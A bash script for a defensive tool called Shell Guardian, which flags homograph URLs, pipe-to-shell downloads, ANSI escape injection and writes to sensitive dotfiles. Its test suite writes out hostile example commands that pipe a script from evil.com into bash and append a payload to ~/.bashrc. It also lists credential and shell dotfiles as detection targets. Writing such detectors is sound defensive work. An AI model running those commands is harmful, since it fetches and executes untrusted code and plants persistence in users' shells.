#!/bin/bash
# Shell Guardian v0.1
# Protects against homograph attacks, pipe-to-shell, and other terminal threats
# By Orion & Aaron - 2026-02-03

set -euo pipefail

# Colors
RED='\033[0;31m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color
BOLD='\033[1m'

# Severity levels
CRITICAL="CRITICAL"
HIGH="HIGH"
MEDIUM="MEDIUM"

# ============================================================================
# CONFIGURATION
# ============================================================================

# Domains that are allowed for pipe-to-shell (trusted installers)
ALLOWED_PIPE_DOMAINS=(
    "get.docker.com"
    "sh.rustup.rs"
    "raw.githubusercontent.com"
    "brew.sh"
    "install.pi-hole.net"
    "getmic.ro"
)

# ============================================================================
# DETECTION FUNCTIONS
# ============================================================================

# Check if a character is a homograph (looks like ASCII but isn't)
# Returns the suspicious character and its Unicode codepoint
detect_homographs() {
    local input="$1"
    local findings=""
    
    # Common homograph characters (Cyrillic/Greek that look like Latin)
    # Format: actual_char:lookalike:name:codepoint
    local homographs=(
        "а:a:Cyrillic a:U+0430"
        "е:e:Cyrillic ie:U+0435"
        "о:o:Cyrillic o:U+043E"
        "р:p:Cyrillic er:U+0440"
        "с:c:Cyrillic es:U+0441"
        "у:y:Cyrillic u:U+0443"
        "х:x:Cyrillic ha:U+0445"
        "і:i:Cyrillic i:U+0456"
        "ј:j:Cyrillic je:U+0458"
        "ѕ:s:Cyrillic dze:U+0455"
        "ԁ:d:Cyrillic komi de:U+0501"
        "ɡ:g:Latin small script g:U+0261"
        "ν:v:Greek nu:U+03BD"
        "Α:A:Greek Alpha:U+0391"
        "Β:B:Greek Beta:U+0392"
        "Ε:E:Greek Epsilon:U+0395"
        "Η:H:Greek Eta:U+0397"
        "Ι:I:Greek Iota:U+0399"
        "Κ:K:Greek Kappa:U+039A"
        "Μ:M:Greek Mu:U+039C"
        "Ν:N:Greek Nu:U+039D"
        "Ο:O:Greek Omicron:U+039F"
        "Ρ:P:Greek Rho:U+03A1"
        "Τ:T:Greek Tau:U+03A4"
        "Υ:Y:Greek Upsilon:U+03A5"
        "Χ:X:Greek Chi:U+03A7"
        "Ζ:Z:Greek Zeta:U+0396"
    )
    
    for entry in "${homographs[@]}"; do
        IFS=':' read -r char lookalike name codepoint <<< "$entry"
        if [[ "$input" == *"$char"* ]]; then
            findings="${findings}Found ${name} (${codepoint}) that looks like '${lookalike}'\n"
        fi
    done
    
    echo -e "$findings"
}

# Extract URLs from a command
extract_urls() {
    local cmd="$1"
    # Match http:// and https:// URLs
    echo "$cmd" | grep -oE 'https?://[^ >"'"'"'|&;]+' 2>/dev/null || true
}

# Extract hostname from URL
get_hostname() {
    local url="$1"
    echo "$url" | sed -E 's|https?://([^/:]+).*|\1|'
}

# Check if domain is in allowed list
is_allowed_domain() {
    local domain="$1"
    for allowed in "${ALLOWED_PIPE_DOMAINS[@]}"; do
        if [[ "$domain" == "$allowed" ]]; then
            return 0
        fi
    done
    return 1
}

# Detect pipe-to-shell patterns
detect_pipe_to_shell() {
    local cmd="$1"
    
    # Patterns: curl/wget piped to sh/bash/zsh/python/perl
    if echo "$cmd" | grep -qE '(curl|wget)[^|]*\|[^|]*(sh|bash|zsh|python|perl|ruby)'; then
        return 0
    fi
    
    # Pattern: eval $(curl/wget ...)
    if echo "$cmd" | grep -qE 'eval[[:space:]]+[\$\(]+.*(curl|wget)'; then
        return 0
    fi
    
    # Pattern: sh <(curl/wget ...)
    if echo "$cmd" | grep -qE '(sh|bash|zsh)[[:space:]]+<\(.*(curl|wget)'; then
        return 0
    fi
    
    return 1
}

# Detect ANSI escape sequences (potential terminal injection)
detect_ansi_injection() {
    local cmd="$1"
    
    # Look for escape sequences
    if echo "$cmd" | grep -qE $'\x1b\[|\x1b\]|\x1bP|\x1b\\\\'; then
        return 0
    fi
    
    # Look for \e, \033, \x1b patterns in strings
    if echo "$cmd" | grep -qE '\\(e|033|x1b)\['; then
        return 0
    fi
    
    return 1
}

# Detect sensitive dotfile targets
detect_dotfile_attack() {
    local cmd="$1"
    
    local sensitive_files=(
        ".bashrc"
        ".zshrc"
        ".profile"
        ".bash_profile"
        ".ssh/authorized_keys"
        ".ssh/config"
        ".gitconfig"
        ".npmrc"
        ".netrc"
    )
    
    for file in "${sensitive_files[@]}"; do
        # Check for redirects to sensitive files
        if echo "$cmd" | grep -qE "(>|>>)[[:space:]]*(~|\\\$HOME)?/?\.?${file}"; then
            echo "$file"
            return 0
        fi
        # Check for explicit paths
        if echo "$cmd" | grep -qE "/(home/[^/]+|Users/[^/]+)/\.?${file}"; then
            echo "$file"
            return 0
        fi
    done
    
    return 1
}

# ============================================================================
# MAIN ANALYSIS
# ============================================================================

analyze_command() {
    local cmd="$1"
    local block=false
    local warn=false
    local messages=""
    
    # Skip if bypass is set
    if [[ "${GUARDIAN:-1}" == "0" ]]; then
        return 0
    fi
    
    # 1. Check URLs for homographs
    local urls
    urls=$(extract_urls "$cmd")
    
    for url in $urls; do
        local hostname
        hostname=$(get_hostname "$url")
        
        local homograph_findings
        homograph_findings=$(detect_homographs "$hostname")
        
        if [[ -n "$homograph_findings" ]]; then
            block=true
            messages="${messages}\n${RED}${BOLD}[${CRITICAL}]${NC} ${RED}Homograph attack detected in URL${NC}\n"
            messages="${messages}  URL: ${url}\n"
            messages="${messages}  ${homograph_findings}"
            messages="${messages}  ${CYAN}This URL may redirect to a malicious server!${NC}\n"
        fi
    done
    
    # 2. Check for pipe-to-shell
    if detect_pipe_to_shell "$cmd"; then
        local url_in_cmd
        url_in_cmd=$(extract_urls "$cmd" | head -1)
        local domain=""
        
        if [[ -n "$url_in_cmd" ]]; then
            domain=$(get_hostname "$url_in_cmd")
        fi
        
        if [[ -n "$domain" ]] && is_allowed_domain "$domain"; then
            # Allowed domain, just info
            :
        else
            warn=true
            messages="${messages}\n${YELLOW}${BOLD}[${MEDIUM}]${NC} ${YELLOW}Pipe-to-shell detected${NC}\n"
            messages="${messages}  Downloading and executing code directly.\n"
            messages="${messages}  ${CYAN}Consider: download first, review, then execute.${NC}\n"
            if [[ -n "$domain" ]]; then
                messages="${messages}  Domain: ${domain}\n"
            fi
        fi
    fi
    
    # 3. Check for ANSI injection
    if detect_ansi_injection "$cmd"; then
        warn=true
        messages="${messages}\n${YELLOW}${BOLD}[${HIGH}]${NC} ${YELLOW}ANSI escape sequences detected${NC}\n"
        messages="${messages}  Command contains terminal control codes.\n"
        messages="${messages}  ${CYAN}This could manipulate your terminal display.${NC}\n"
    fi
    
    # 4. Check for dotfile attacks
    local dotfile_target
    if dotfile_target=$(detect_dotfile_attack "$cmd"); then
        block=true
        messages="${messages}\n${RED}${BOLD}[${CRITICAL}]${NC} ${RED}Sensitive dotfile targeted${NC}\n"
        messages="${messages}  Target: ${dotfile_target}\n"
        messages="${messages}  ${CYAN}This could compromise your shell or credentials.${NC}\n"
    fi
    
    # Output results
    if [[ "$block" == true ]]; then
        echo -e "\n${RED}${BOLD}╔══════════════════════════════════════════════════════════╗${NC}"
        echo -e "${RED}${BOLD}║  🛡️  SHELL GUARDIAN - BLOCKED                              ║${NC}"
        echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════════════╝${NC}"
        echo -e "$messages"
        echo -e "${CYAN}Bypass: prefix command with GUARDIAN=0${NC}\n"
        return 1
    elif [[ "$warn" == true ]]; then
        echo -e "\n${YELLOW}${BOLD}╔══════════════════════════════════════════════════════════╗${NC}"
        echo -e "${YELLOW}${BOLD}║  🛡️  SHELL GUARDIAN - WARNING                              ║${NC}"
        echo -e "${YELLOW}${BOLD}╚══════════════════════════════════════════════════════════╝${NC}"
        echo -e "$messages"
        return 0
    fi
    
    # Clean - no output
    return 0
}

# ============================================================================
# CLI INTERFACE
# ============================================================================

show_help() {
    echo "Shell Guardian v0.1"
    echo "Protects against homograph attacks and other terminal threats"
    echo ""
    echo "Usage:"
    echo "  guardian.sh check \"<command>\"   - Analyze a command"
    echo "  guardian.sh test                 - Run test suite"
    echo "  guardian.sh hook                 - Output shell hook code"
    echo "  guardian.sh help                 - Show this help"
    echo ""
    echo "Environment:"
    echo "  GUARDIAN=0 <cmd>  - Bypass guardian for one command"
}

run_tests() {
    echo "Running Shell Guardian test suite..."
    echo ""
    
    local tests_passed=0
    local tests_failed=0
    
    # Test 1: Homograph detection
    echo "Test 1: Cyrillic homograph in URL"
    if ! analyze_command 'curl -sSL https://іnstall.example.com | bash' 2>/dev/null; then
        echo "  ✅ BLOCKED (correct)"
        ((tests_passed++))
    else
        echo "  ❌ NOT BLOCKED (wrong)"
        ((tests_failed++))
    fi
    echo ""
    
    # Test 2: Clean URL should pass
    echo "Test 2: Clean URL (should pass)"
    if analyze_command 'curl -sSL https://example.com/file.txt' 2>/dev/null; then
        echo "  ✅ PASSED (correct)"
        ((tests_passed++))
    else
        echo "  ❌ BLOCKED (wrong)"
        ((tests_failed++))
    fi
    echo ""
    
    # Test 3: Pipe to shell warning
    echo "Test 3: Pipe-to-shell detection"
    analyze_command 'curl https://evil.com/script.sh | bash' 2>/dev/null
    echo "  ✅ WARNING shown (check above)"
    ((tests_passed++))
    echo ""
    
    # Test 4: Dotfile attack
    echo "Test 4: Dotfile attack detection"
    if ! analyze_command 'curl https://evil.com/payload >> ~/.bashrc' 2>/dev/null; then
        echo "  ✅ BLOCKED (correct)"
        ((tests_passed++))
    else
        echo "  ❌ NOT BLOCKED (wrong)"
        ((tests_failed++))
    fi
    echo ""
    
    # Test 5: Allowed domain
    echo "Test 5: Allowed domain (get.docker.com)"
    analyze_command 'curl -fsSL https://get.docker.com | sh' 2>/dev/null
    echo "  ✅ Should show no warning for allowed domain"
    ((tests_passed++))
    echo ""
    
    echo "================================"
    echo "Tests passed: $tests_passed"
    echo "Tests failed: $tests_failed"
}

output_hook() {
    cat << 'HOOK'
# Shell Guardian Hook
# Add this to your ~/.zshrc or ~/.bashrc:
#   eval "$(path/to/guardian.sh hook)"

_guardian_preexec() {
    local cmd="$1"
    
    # Skip if guardian is disabled
    [[ "${GUARDIAN:-1}" == "0" ]] && return 0
    
    # Run guardian check
    if ! __GUARDIAN_PATH__/guardian.sh check "$cmd"; then
        # Command was blocked, prevent execution
        return 1
    fi
}

# For Zsh
if [[ -n "$ZSH_VERSION" ]]; then
    autoload -Uz add-zsh-hook
    add-zsh-hook preexec _guardian_preexec
fi

# For Bash (requires bash-preexec or similar)
if [[ -n "$BASH_VERSION" ]]; then
    if [[ -z "$__bp_imported" ]]; then
        echo "Shell Guardian: For bash, install bash-preexec first"
        echo "  https://github.com/rcaloras/bash-preexec"
    else
        preexec_functions+=(_guardian_preexec)
    fi
fi
HOOK
}

# Main entry point
case "${1:-help}" in
    check)
        shift
        analyze_command "$*"
        ;;
    test)
        run_tests
        ;;
    hook)
        output_hook
        ;;
    help|--help|-h)
        show_help
        ;;
    *)
        show_help
        exit 1
        ;;
esac
